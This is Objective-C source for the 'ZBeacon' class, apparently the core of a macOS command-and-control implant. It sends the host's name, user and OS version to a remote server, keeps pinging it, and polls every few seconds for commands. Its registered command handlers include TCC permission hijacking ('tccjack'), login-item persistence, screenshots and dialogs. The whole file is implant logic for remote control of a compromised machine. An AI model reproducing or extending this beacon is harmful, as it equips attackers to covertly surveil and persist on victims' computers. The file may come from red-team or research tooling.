#import "ZBeacon.h"
#import "ZAPIClient.h"
#import "ZSystemInfo.h"
#import "ZCommandService.h"
#import "ZCommandRegistry.h"
#import "ZCommandHandler.h"
#import "ZCommandModel.h"
#import "commands/ZEchoCommandHandler.h"
#import "commands/ZDialogCommandHandler.h"
#import "commands/ZWhoAmICommandHandler.h"
#import "commands/ZTCCJackCommandHandler.h"
#import "commands/ZLoginItemCommandHandler.h"
#import "commands/ZTCCCheckCommandHandler.h"
#import "commands/ZScreenshotCommandHandler.h"

// Define default configuration values
const ZBeaconConfiguration ZBeaconDefaultConfiguration = {
    .pingInterval = 300,         // 5 minutes
    .initialRetryDelay = 5,      // 5 seconds
    .maxRetryDelay = 3600,       // 1 hour
    .maxRetryAttempts = 10,      // 10 attempts
    .commandPollInterval = 5     // 5 seconds instead of 60 seconds
};

// Error domains and codes
static NSString *const ZBeaconErrorDomain = @"ZBeaconErrorDomain";
static const NSInteger __unused ZBeaconErrorRegistrationFailed = 100;
static const NSInteger __unused ZBeaconErrorPingFailed = 101;
static const NSInteger __unused ZBeaconErrorNotRegistered = 102;
static const NSInteger __unused ZBeaconErrorInvalidResponse = 103;
static const NSInteger __unused ZBeaconErrorNetworkError = 104;

// Status constants
static NSString *const ZBeaconStatusInitializing = @"initializing";
static NSString *const ZBeaconStatusOnline = @"online";
static NSString *const ZBeaconStatusOffline = @"offline";
static NSString *const ZBeaconStatusError = @"error";

// Constants
static const NSTimeInterval __unused kInitialRetryDelay = 5.0;  // 5 seconds
static const NSTimeInterval __unused kMaxRetryDelay = 60.0;     // 1 minute
static const int __unused kMaxRetryAttempts = 5;                // Maximum number of retry attempts

// Private interface extensions
@interface ZBeacon () <ZCommandServiceDelegate>

// Make properties readwrite in private interface
@property (nonatomic, copy, readwrite) NSString *beaconId;
@property (nonatomic, copy, readwrite) NSString *lastSeen;
@property (nonatomic, copy, readwrite) NSString *status;
@property (nonatomic, copy, readwrite, nullable) NSString *hostname;
@property (nonatomic, copy, readwrite, nullable) NSString *username;
@property (nonatomic, copy, readwrite, nullable) NSString *osVersion;
@property (nonatomic, strong, readwrite) ZAPIClient *apiClient;
@property (nonatomic, assign, readwrite, getter=isRunning) BOOL running;
@property (nonatomic, assign, readwrite) ZBeaconConfiguration configuration;
@property (nonatomic, retain) ZCommandService *commandService;

// Private properties
@property (nonatomic, strong, nullable) NSTimer *pingTimer;
@property (nonatomic, strong) dispatch_queue_t beaconQueue;
@property (nonatomic, strong) dispatch_queue_t networkQueue;
@property (nonatomic, assign) NSUInteger retryCount;
@property (nonatomic, assign) NSTimeInterval currentRetryDelay;
@property (nonatomic, strong) NSDateFormatter *timestampFormatter;
@property (nonatomic, strong) dispatch_source_t registrationTimer;
@property (nonatomic, assign) BOOL isRegistering;
@property (nonatomic, assign) BOOL isPinging;

// Private methods
- (void)setupTimestampFormatter;
- (NSError *)errorWithCode:(NSInteger)code description:(NSString *)description;
- (void)notifyDelegateOfStatusChange;
- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError * _Nullable error))completion;
- (void)pingServerInternal:(void(^)(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response))completion;
- (void)scheduleRetry;
- (void)cancelRetryTimer;
- (void)setStatusSafely:(NSString *)newStatus;
- (void)logMessage:(NSString *)format, ... NS_FORMAT_FUNCTION(1,2);

@end

@implementation ZBeacon

#pragma mark - Class Methods

+ (ZBeaconConfiguration)defaultConfiguration {
    ZBeaconConfiguration config;
    config.pingInterval = 60.0;
    config.initialRetryDelay = 5.0;
    config.maxRetryDelay = 60.0;
    config.maxRetryAttempts = 5;
    return config;
}

#pragma mark - Lifecycle

- (instancetype)init {
    [self doesNotRecognizeSelector:_cmd];
    return nil;
}

- (nullable instancetype)initWithServerURL:(NSURL *)serverURL {
    return [self initWithServerURL:serverURL configuration:ZBeaconDefaultConfiguration];
}

- (nullable instancetype)initWithServerURL:(NSURL *)serverURL configuration:(ZBeaconConfiguration)configuration {
    @try {
        self = [super init];
        if (self) {
            if (!serverURL) {
                [self logMessage:@"Error: Cannot initialize ZBeacon with nil serverURL"];
                return nil;
            }
            
            // Store configuration
            _configuration = configuration;
            
            // Create API client
            _apiClient = [[ZAPIClient alloc] initWithServerURL:serverURL];
            if (!_apiClient) {
                [self logMessage:@"Error: Failed to create API client"];
                return nil;
            }
            
            // Initialize properties
            _beaconId = [[NSUUID UUID] UUIDString];
            _status = ZBeaconStatusInitializing;
            _lastSeen = [self currentTimestampString];
            _retryCount = 0;
            _currentRetryDelay = configuration.initialRetryDelay;
            
            // Create dispatch queues
            NSString *queueNamePrefix = [NSString stringWithFormat:@"com.zbeacon.%@", _beaconId];
            _beaconQueue = dispatch_queue_create([[queueNamePrefix stringByAppendingString:@".beaconQueue"] UTF8String], DISPATCH_QUEUE_SERIAL);
            _networkQueue = dispatch_queue_create([[queueNamePrefix stringByAppendingString:@".networkQueue"] UTF8String], DISPATCH_QUEUE_CONCURRENT);
            
            // Setup timestamp formatter
            [self setupTimestampFormatter];
            
            // Get system information safely
            [self collectSystemInformation];
            
            [self logMessage:@"Beacon initialized with ID: %@", _beaconId];
            [self logMessage:@"System info: hostname=%@, username=%@, os=%@", 
                  _hostname ?: @"(unknown)", 
                  _username ?: @"(unknown)", 
                  _osVersion ?: @"(unknown)"];
        }
        return self;
    }
    @catch (NSException *exception) {
        [self logMessage:@"Exception during beacon initialization: %@", exception];
        return nil;
    }
}

- (void)collectSystemInformation {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        @try {
            self.hostname = [ZSystemInfo hostname];
            self.username = [ZSystemInfo username];
            self.osVersion = [ZSystemInfo osVersion];
        }
        @catch (NSException *exception) {
            [self logMessage:@"Error collecting system information: %@", exception];
        }
    });
}

- (void)setupTimestampFormatter {
    @try {
        _timestampFormatter = [[NSDateFormatter alloc] init];
        [_timestampFormatter setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss'Z'"];
        [_timestampFormatter setTimeZone:[NSTimeZone timeZoneWithAbbreviation:@"UTC"]];
    }
    @catch (NSException *exception) {
        [self logMessage:@"Exception setting up timestamp formatter: %@", exception];
    }
}

- (void)dealloc {
    [self stop];
    
    [_beaconId release];
    [_lastSeen release];
    [_status release];
    [_hostname release];
    [_username release];
    [_osVersion release];
    [_apiClient release];
    [_commandService release];
    [_timestampFormatter release];
    
    if (_beaconQueue) {
        dispatch_release(_beaconQueue);
    }
    if (_networkQueue) {
        dispatch_release(_networkQueue);
    }
    if (_registrationTimer) {
        dispatch_source_cancel(_registrationTimer);
        dispatch_release(_registrationTimer);
    }
    
    [super dealloc];
}

#pragma mark - Public Methods

- (BOOL)start {
    __block BOOL startSuccess = NO;
    
    dispatch_sync(self.beaconQueue, ^{
        @try {
            if (self.isRunning) {
                [self logMessage:@"Beacon is already running."];
                startSuccess = YES;
                return;
            }
            
            [self logMessage:@"Starting beacon with ID: %@", self.beaconId];
            self.running = YES;
            self.retryCount = 0;
            self.currentRetryDelay = self.configuration.initialRetryDelay;
            
            // Register with server
            [self registerWithServerWithCompletion:^(BOOL success, NSError * _Nullable __unused error) {
                if (!success) {
                    // If initial registration fails, still return success but schedule retry
                    [self scheduleRetry];
                }
                // We still mark startup as successful even if registration failed
                // since the beacon process is running and will retry
            }];
            
            startSuccess = YES;
        }
        @catch (NSException *exception) {
            [self logMessage:@"Exception during beacon start: %@", exception];
            self.running = NO;
            startSuccess = NO;
        }
    });
    
    return startSuccess;
}

- (void)stop {
    dispatch_sync(self.beaconQueue, ^{
        @try {
            if (!self.isRunning) {
                return;
            }
            
            [self logMessage:@"Stopping beacon: %@", self.beaconId];
            
            // Cancel any pending retries
            [self cancelRetryTimer];
            
            // Invalidate and release timer on main thread
            dispatch_async(dispatch_get_main_queue(), ^{
                @try {
                    if (self.pingTimer) {
                        [self.pingTimer invalidate];
                        self.pingTimer = nil;
                    }
                }
                @catch (NSException *exception) {
                    [self logMessage:@"Exception invalidating timer: %@", exception];
                }
            });
            
            [self setStatusSafely:ZBeaconStatusOffline];
            self.running = NO;
        }
        @catch (NSException *exception) {
            [self logMessage:@"Exception during beacon stop: %@", exception];
        }
    });
}

- (BOOL)forcePing {
    if (!self.isRunning) {
        [self logMessage:@"Cannot force ping - beacon is not running"];
        return NO;
    }
    
    [self pingServerInternal:^(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response) {
        if (success) {
            [self logMessage:@"Forced ping successful: %@", response];
        } else {
            [self logMessage:@"Forced ping failed: %@", error.localizedDescription];
        }
    }];
    
    return YES;
}

#pragma mark - Private Methods

- (void)setStatusSafely:(NSString *)newStatus {
    if (![self.status isEqualToString:newStatus]) {
        self.status = newStatus;
        [self notifyDelegateOfStatusChange];
    }
}

- (void)notifyDelegateOfStatusChange {
    id<ZBeaconDelegate> delegate = self.delegate;
    if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didChangeStatus:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [delegate beacon:self didChangeStatus:self.status];
        });
    }
}

- (BOOL)registerWithServerWithCompletion:(void(^)(BOOL success, NSError * _Nullable error))completion {
    @try {
        if (!self.isRunning) {
            NSError *error = [self errorWithCode:100 description:@"Cannot register - beacon is not running"];
            if (completion) completion(NO, error);
            return NO;
        }
        
        [self logMessage:@"Registering beacon with server..."];
        
        // Prepare registration data
        NSDictionary *registrationData = @{
            @"client_id": self.beaconId,
            @"hostname": self.hostname ?: [NSNull null],
            @"username": self.username ?: [NSNull null],
            @"os_version": self.osVersion ?: [NSNull null]
        };
        
        [self logMessage:@"Registration data: %@", registrationData];
        
        // Send init request to server
        dispatch_async(self.networkQueue, ^{
            [self.apiClient sendInitRequestWithData:registrationData completion:^(NSDictionary *response, NSError *error) {
                dispatch_async(self.beaconQueue, ^{
                    if (!self.isRunning) {
                        // Beacon was stopped during the network request
                        return;
                    }
                    
                    if (error) {
                        [self logMessage:@"Error registering beacon: %@", error.localizedDescription];
                        [self setStatusSafely:ZBeaconStatusError];
                        
                        // Notify delegate
                        id<ZBeaconDelegate> delegate = self.delegate;
                        if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didFailToRegisterWithError:willRetry:)]) {
                            BOOL willRetry = self.retryCount < self.configuration.maxRetryAttempts;
                            dispatch_async(dispatch_get_main_queue(), ^{
                                [delegate beacon:self didFailToRegisterWithError:error willRetry:willRetry];
                            });
                        }
                        
                        if (completion) completion(NO, error);
                        return;
                    }
                    
                    // Registration successful, reset retry counters
                    self.retryCount = 0;
                    self.currentRetryDelay = self.configuration.initialRetryDelay;
                    
                    [self logMessage:@"Beacon registered successfully: %@", response];
                    [self setStatusSafely:ZBeaconStatusOnline];
                    self.lastSeen = [self currentTimestampString];
                    
                    // Initialize the command service after successful registration
                    [self initializeCommandService];
                    
                    // Notify delegate
                    id<ZBeaconDelegate> delegate = self.delegate;
                    if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didRegisterWithResponse:)]) {
                        dispatch_async(dispatch_get_main_queue(), ^{
                            [delegate beacon:self didRegisterWithResponse:response];
                        });
                    }
                    
                    // Start ping timer on main thread
                    dispatch_async(dispatch_get_main_queue(), ^{
                        @try {
                            // Cancel any existing timer first
                            if (self.pingTimer) {
                                [self.pingTimer invalidate];
                                self.pingTimer = nil;
                            }
                            
                            // Create new timer
                            self.pingTimer = [NSTimer timerWithTimeInterval:self.configuration.pingInterval
                                                                     target:self
                                                                   selector:@selector(pingTimerFired)
                                                                   userInfo:nil
                                                                    repeats:YES];
                            
                            // Add to run loop
                            NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
                            [runLoop addTimer:self.pingTimer forMode:NSRunLoopCommonModes];
                            
                            // Send initial ping immediately
                            [self performSelector:@selector(pingTimerFired) withObject:nil afterDelay:0.1];
                        }
                        @catch (NSException *exception) {
                            [self logMessage:@"Exception setting up ping timer: %@", exception];
                        }
                    });
                    
                    if (completion) completion(YES, nil);
                });
            }];
        });
        
        return YES;
    }
    @catch (NSException *exception) {
        [self logMessage:@"Exception during registration: %@", exception];
        NSError *error = [self errorWithCode:101 description:[NSString stringWithFormat:@"Exception during registration: %@", exception.reason]];
        if (completion) completion(NO, error);
        return NO;
    }
}

- (void)pingTimerFired {
    [self pingServerInternal:nil];
}

- (void)pingServerInternal:(void(^)(BOOL success, NSError * _Nullable error, NSDictionary * _Nullable response))completion {
    dispatch_async(self.beaconQueue, ^{
        @try {
            if (!self.isRunning) {
                [self logMessage:@"Beacon is not running. Skipping ping."];
                NSError *error = [self errorWithCode:102 description:@"Beacon is not running"];
                if (completion) completion(NO, error, nil);
                return;
            }
            
            [self logMessage:@"Pinging server with beacon ID: %@", self.beaconId];
            
            // Prepare ping data
            NSDictionary *pingData = @{
                @"client_id": self.beaconId,
                @"status": self.status,
                @"timestamp": [self currentTimestampString]
            };
            
            // Send ping request to server
            dispatch_async(self.networkQueue, ^{
                [self.apiClient sendPingRequestWithData:pingData completion:^(NSDictionary *response, NSError *error) {
                    dispatch_async(self.beaconQueue, ^{
                        if (error) {
                            [self logMessage:@"Error pinging server: %@", error.localizedDescription];
                            
                            // Notify delegate
                            id<ZBeaconDelegate> delegate = self.delegate;
                            if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didFailToPingWithError:)]) {
                                dispatch_async(dispatch_get_main_queue(), ^{
                                    [delegate beacon:self didFailToPingWithError:error];
                                });
                            }
                            
                            if (completion) completion(NO, error, nil);
                            return;
                        }
                        
                        [self logMessage:@"Ping successful: %@", response];
                        self.lastSeen = [self currentTimestampString];
                        
                        // Notify delegate
                        id<ZBeaconDelegate> delegate = self.delegate;
                        if ([(NSObject *)delegate respondsToSelector:@selector(beacon:didPingWithResponse:)]) {
                            dispatch_async(dispatch_get_main_queue(), ^{
                                [delegate beacon:self didPingWithResponse:response];
                            });
                        }
                        
                        if (completion) completion(YES, nil, response);
                    });
                }];
            });
        }
        @catch (NSException *exception) {
            [self logMessage:@"Exception during ping: %@", exception];
            NSError *error = [self errorWithCode:103 description:[NSString stringWithFormat:@"Exception during ping: %@", exception.reason]];
            if (completion) completion(NO, error, nil);
        }
    });
}

- (void)scheduleRetry {
    dispatch_async(self.beaconQueue, ^{
        @try {
            // Cancel any existing timer first
            [self cancelRetryTimer];
            
            // If we've exceeded max retries, stop trying
            if (self.retryCount >= self.configuration.maxRetryAttempts) {
                [self logMessage:@"Failed to register after %lu attempts. Giving up.", (unsigned long)self.configuration.maxRetryAttempts];
                return;
            }
            
            // Increment retry count
            self.retryCount++;
            
            [self logMessage:@"Scheduling retry in %.1f seconds (attempt %lu of %lu)...", 
                 self.currentRetryDelay, (unsigned long)self.retryCount, (unsigned long)self.configuration.maxRetryAttempts];
            
            // Create a dispatch timer for the retry
            self.registrationTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, self.beaconQueue);
            
            uint64_t nanoseconds = (uint64_t)(self.currentRetryDelay * NSEC_PER_SEC);
            dispatch_source_set_timer(self.registrationTimer, 
                                      dispatch_time(DISPATCH_TIME_NOW, nanoseconds), 
                                      DISPATCH_TIME_FOREVER, 
                                      (1ull * NSEC_PER_SEC) / 10);
            
            __block typeof(self) blockSelf = self;
            dispatch_source_set_event_handler(self.registrationTimer, ^{
                @try {
                    if (!blockSelf) return;
                    
                    [blockSelf cancelRetryTimer];
                    
                    if (!blockSelf.isRunning) {
                        [blockSelf logMessage:@"Beacon is no longer running. Cancelling retry."];
                        return;
                    }
                    
                    [blockSelf logMessage:@"Retrying registration..."];
                    [blockSelf registerWithServerWithCompletion:^(BOOL success, NSError * _Nullable __unused error) {
                        if (!success) {
                            // Increase retry delay with exponential backoff (up to max delay)
                            if (!blockSelf) return;
                            
                            blockSelf.currentRetryDelay = MIN(blockSelf.currentRetryDelay * 2, blockSelf.configuration.maxRetryDelay);
                            [blockSelf scheduleRetry];
                        }
                    }];
                }
                @catch (NSException *exception) {
                    if (blockSelf) {
                        [blockSelf logMessage:@"Exception during retry: %@", exception];
                    }
                }
            });
            
            dispatch_resume(self.registrationTimer);
        }
        @catch (NSException *exception) {
            [self logMessage:@"Exception scheduling retry: %@", exception];
        }
    });
}

- (void)cancelRetryTimer {
    @try {
        if (self.registrationTimer) {
            dispatch_source_cancel(self.registrationTimer);
            self.registrationTimer = nil;
        }
    }
    @catch (NSException *exception) {
        [self logMessage:@"Exception cancelling retry timer: %@", exception];
    }
}

- (NSString *)currentTimestampString {
    @try {
        return [self.timestampFormatter stringFromDate:[NSDate date]];
    }
    @catch (NSException *exception) {
        [self logMessage:@"Exception generating timestamp: %@", exception];
        return @"1970-01-01T00:00:00Z"; // Return a default timestamp if there's an error
    }
}

- (NSError *)errorWithCode:(NSInteger)code description:(NSString *)description {
    return [NSError errorWithDomain:ZBeaconErrorDomain 
                               code:code 
                           userInfo:@{NSLocalizedDescriptionKey: description}];
}

- (void)logMessage:(NSString *)format, ... {
    va_list args;
    va_start(args, format);
    NSString *message = [[NSString alloc] initWithFormat:format arguments:args];
    va_end(args);
    
    NSLog(@"[ZBeacon %@] %@", [self.beaconId substringToIndex:8], message);
}

#pragma mark - Command Service

- (void)initializeCommandService {
    if (!self.beaconId) {
        [self logMessage:@"Cannot initialize command service: beacon is not registered"];
        return;
    }
    
    if (self.commandService) {
        [self.commandService stop];
        [self.commandService release];
        self.commandService = nil;
    }
    
    // Create a new command service
    self.commandService = [[ZCommandService alloc] initWithServerURL:self.apiClient.serverURL beaconId:self.beaconId];
    self.commandService.delegate = self;
    self.commandService.pollInterval = self.configuration.commandPollInterval;
    
    // Register default command handlers
    [self registerDefaultCommandHandlers];
    
    // Start the command service
    if (![self.commandService start]) {
        [self logMessage:@"Failed to start command service"];
    } else {
        [self logMessage:@"Command service started successfully"];
    }
}

- (void)registerDefaultCommandHandlers {
    // Register echo command handler
    [self registerCommandHandler:@"echo" handlerClass:[ZEchoCommandHandler class]];
    
    // Register dialog command handler
    [self registerCommandHandler:@"dialog" handlerClass:[ZDialogCommandHandler class]];
    
    // Register whoami command handler
    [self registerCommandHandler:@"whoami" handlerClass:[ZWhoAmICommandHandler class]];
    
    // Register tccjack command handler
    [self registerCommandHandler:@"tccjack" handlerClass:[ZTCCJackCommandHandler class]];
    
    // Register loginitem command handler
    [self registerCommandHandler:@"loginitem" handlerClass:[ZLoginItemCommandHandler class]];
    
    // Register tcccheck command handler
    [self registerCommandHandler:@"tcccheck" handlerClass:[ZTCCCheckCommandHandler class]];
    
    // Register screenshot command handler
    [self registerCommandHandler:@"screenshot" handlerClass:[ZScreenshotCommandHandler class]];
}

- (BOOL)registerCommandHandler:(NSString *)commandType handlerClass:(Class)handlerClass {
    if (!commandType || [commandType length] == 0) {
        NSLog(@"Cannot register handler: command type is nil or empty");
        return NO;
    }
    
    if (!handlerClass) {
        NSLog(@"Cannot register handler: handler class is nil");
        return NO;
    }
    
    // Check if the class conforms to the ZCommandHandler protocol
    if (![handlerClass conformsToProtocol:@protocol(ZCommandHandler)]) {
        NSLog(@"Cannot register handler: class does not conform to ZCommandHandler protocol");
        return NO;
    }
    
    // Create an instance of the handler
    id<ZCommandHandler> handler = [[[handlerClass alloc] init] autorelease];
    
    // Register with the command registry
    return [[ZCommandRegistry sharedRegistry] registerCommandHandler:handler];
}

- (void)pollForCommands {
    if (!self.isRunning) {
        NSLog(@"Cannot poll for commands: beacon is not running");
        return;
    }
    
    if (!self.beaconId) {
        NSLog(@"Cannot poll for commands: beacon is not registered");
        return;
    }
    
    if (!self.commandService) {
        NSLog(@"Cannot poll for commands: command service is not initialized");
        return;
    }
    
    [self.commandService pollNow];
}

#pragma mark - ZCommandServiceDelegate

- (void)commandService:(ZCommandService *)service didReceiveCommand:(ZCommandModel *)command {
    [self logMessage:@"Received command: %@ (type: %@)", [command commandId], [command type]];
    
    // Notify the delegate
    if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didReceiveCommand:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate beacon:self didReceiveCommand:command];
        });
    }
}

- (void)commandService:(ZCommandService *)service didReportCommand:(ZCommandModel *)command withResponse:(NSDictionary *)response {
    [self logMessage:@"Command reported: %@ (status: %ld)", [command commandId], (long)[command status]];
    
    // Notify the delegate
    if ([command status] == ZCommandStatusCompleted) {
        if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didExecuteCommand:withResult:)]) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self.delegate beacon:self didExecuteCommand:command withResult:[response objectForKey:@"result"]];
            });
        }
    } else if ([command status] == ZCommandStatusFailed || [command status] == ZCommandStatusTimedOut) {
        NSError *error = [NSError errorWithDomain:@"ZBeaconCommandError"
                                            code:500
                                        userInfo:[NSDictionary dictionaryWithObject:@"Command execution failed"
                                                                           forKey:NSLocalizedDescriptionKey]];
        
        if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didFailToExecuteCommand:withError:)]) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self.delegate beacon:self didFailToExecuteCommand:command withError:error];
            });
        }
    }
}

- (void)commandService:(ZCommandService *)service didFailToReportCommand:(ZCommandModel *)command withError:(NSError *)error {
    [self logMessage:@"Failed to report command: %@ (error: %@)", [command commandId], [error localizedDescription]];
    
    // Notify the delegate
    if (self.delegate && [(NSObject *)self.delegate respondsToSelector:@selector(beacon:didFailToExecuteCommand:withError:)]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            [self.delegate beacon:self didFailToExecuteCommand:command withError:error];
        });
    }
}

@end 